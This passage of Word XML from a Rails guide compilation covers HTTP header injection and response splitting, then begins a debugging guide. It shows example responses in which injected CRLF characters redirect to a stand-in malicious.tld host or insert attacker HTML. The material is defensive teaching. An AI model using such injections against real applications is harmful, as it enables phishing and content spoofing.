          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> header for the second example will be the following because the second Location header field overwrites the first.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="51F3714B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AB43251" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HTTP/1.1 302 Moved Temporarily</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DFB07B8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(...)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="026403D3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">Location: </w:t>
            </w:r>
            <w:hyperlink r:id="rId747" w:history="1">
              <w:r>
                <w:rPr>
                  <w:rStyle w:val="a3"/>
                </w:rPr>
                <w:t>http://www.malicious.tld</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="034E3A92" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">So </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve">attack vectors for Header Injection are based on the injection of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>CRLF</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t xml:space="preserve"> characters in a header field.</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>redirect_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Make sure you do it yourself when you build other header fields with user input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B29A1DE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>8.8.1 Response Splitting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3733AFA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If Header Injection was possible, Response Splitting might be, too. In </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTTP</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the header block is followed by two CRLFs and the actual data (usually </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t>. The response will be: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F28687B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="54E6305F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HTTP/1.1 302 Found [First standard 302 response]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1DDA87C7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Date: Tue, 12 Apr 2005 22:09:07 GMT</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="639799E8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Location:</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:rFonts w:ascii="MS Gothic" w:eastAsia="MS Gothic" w:hAnsi="MS Gothic" w:cs="MS Gothic" w:hint="eastAsia"/>
              </w:rPr>
              <w:t> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t>Content-Type: text/htm</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>l</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="49F85776" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57401F36" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51FA302F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>HTTP/1.1 200 OK [Second New response created by attacker begins]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0617658D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Content-Type: text/html</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4A9F89F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="657CCE53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="00044130" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&amp;lt;html&amp;gt;&amp;lt;font color=red&amp;gt;hey&amp;lt;/font&amp;gt;&amp;lt;/html&amp;gt; [Arbitary malicious input is</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E458BA8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Keep-Alive: timeout=15, max=100         shown as the redirected page]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D0B6EDF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Connection: Keep-Alive</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0AA92340" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Transfer-Encoding: chunked</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="15BA179C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Content-Type: text/html</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6C3D01FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Under certain circumstances this would present the malicious </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HTML</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can’t rely on this. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B820F70" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>9 Additional Resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4797354C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE476F5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="343"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The Ruby on Rails security project posts security news regularly: </w:t>
      </w:r>
      <w:hyperlink r:id="rId748" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>http://www.rorsecurity.info</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6DB46061" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="343"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Subscribe to the Rails security </w:t>
      </w:r>
      <w:hyperlink r:id="rId749" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>mailing list</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3BE25F1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="343"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId750" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Keep up to date on the other application layers</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> (they have a weekly newsletter, too)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="766737A4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="343"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A </w:t>
      </w:r>
      <w:hyperlink r:id="rId751" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>good security blog</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> including the </w:t>
      </w:r>
      <w:hyperlink r:id="rId752" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Cross-Site scripting Cheat Sheet</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="70CE8E8E" w14:textId="74A1988E" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.6、</w:t>
      </w:r>
      <w:hyperlink r:id="rId753" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Debugging Rails Applications</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F3FC0B7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide introduces techniques for debugging Ruby on Rails applications. By referring to this guide, you will be able to:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD11250" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="344"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Understand the purpose of debugging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EB834C4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="344"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Track down problems and issues in your application that your tests aren’t identifying</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BCD3BC4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="344"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Learn the different ways of debugging</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7A8BB7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="344"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Analyze the stack trace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="274EF08E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6F41D8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId754" w:anchor="1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>View Helpers for Debugging</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="393DAF2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId755" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>debug</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E75EB34" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId756" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>to_yaml</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5CCCD08D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId757" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>inspect</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3869A6F0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId758" w:anchor="2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Logger</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="48360660" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId759" w:anchor="2-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>What is the Logger?</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5B9F6BC3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId760" w:anchor="2-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Log Levels</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0DF5FE58" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId761" w:anchor="2-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Sending Messages</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="312B3C07" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId762" w:anchor="3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Debugging with </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ruby-debug</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="62AAAC03" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId763" w:anchor="3-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Setup</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4895D644" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId764" w:anchor="3-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Shell</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3749CD1D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId765" w:anchor="3-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>The Context</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="254EA648" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId766" w:anchor="3-4" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Threads</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="554DDC57" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId767" w:anchor="3-5" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Inspecting Variables</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="270ADAB0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId768" w:anchor="3-6" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Step by Step</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="667446AF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="345"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId769" w:anchor="3-7" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Breakpoints</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
